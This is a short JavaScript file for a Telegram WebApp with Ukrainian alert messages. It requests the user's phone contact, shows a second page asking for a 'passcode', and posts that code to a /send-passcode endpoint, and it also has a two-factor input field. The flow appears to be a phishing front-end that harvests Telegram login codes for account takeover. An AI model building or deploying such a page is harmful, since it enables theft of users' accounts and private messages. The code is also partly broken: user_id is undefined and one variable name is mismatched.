document.addEventListener('DOMContentLoaded', () => {
    const tg = window.Telegram.WebApp;

    let page = 'page1';

    const loginBtn = document.getElementById('loginbtn');
    const page1 = document.getElementById('page1');
    const page2 = document.getElementById('page2');
    const blur = document.getElementById('blur');
    const TEST = document.getElementById('TEST');
    const passcodeBtn = document.getElementById('passcode-btn');
    const passcodeInput = document.getElementById('hiddenInput');
    const twofactorInput = document.getElementById('twofactor-input');

    loginBtn.addEventListener('click', async () => {
        try {
            tg.requestContact();
            tg.onEvent('contactRequested', (data) => {
                if (data.status === 'sent') {
                    showPage2();
                }
            });
        } catch (error) {
            console.log('[ERROR]: ' + error);
        }
    });
    function showPage2() {
        page = 'page2';
        page2.style.display = 'flex';
        requestAnimationFrame(() => {
            page2.style.transform = 'translateY(0)';
        });
        blur.style.zIndex = '0';
        page2.style.zIndex = '100';
        blur.style.opacity = '1';
        loginbtn.style.display = 'none';
    }

    blur.addEventListener('click', () => {
        if (page === 'page2') {
            blur.style.zIndex = '-1';
            page2.style.display = 'none';
            blur.style.opacity = '0';
            loginbtn.style.display = 'flex';
            page = 'page1';

            requestAnimationFrame(() => {
                page2.style.transform = 'translateY(40px)';
            });
        }
    });

    passcodeBtn.addEventListener('click', async () => {
        const passcode = passcodeInput.value;

        if (!passcode) {
            console.log('❌ Passcode is empty');
            return;
        }

        fetch("/send-passcode", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ passcode: passcode, user_id: user_id })
        })
        .then(res => res.json())
        .then(data => {
            if (data.success) {
                tg.showAlert("✅ Код успішно надіслано!");
            } else {
                tg.showAlert("❌ Помилка при надсиланні коду.");
            }
        })
        .catch(err => {
            console.error("Error:", err);
            tg.showAlert("⚠️ Не вдалося надіслати код.");
        });
    });
});
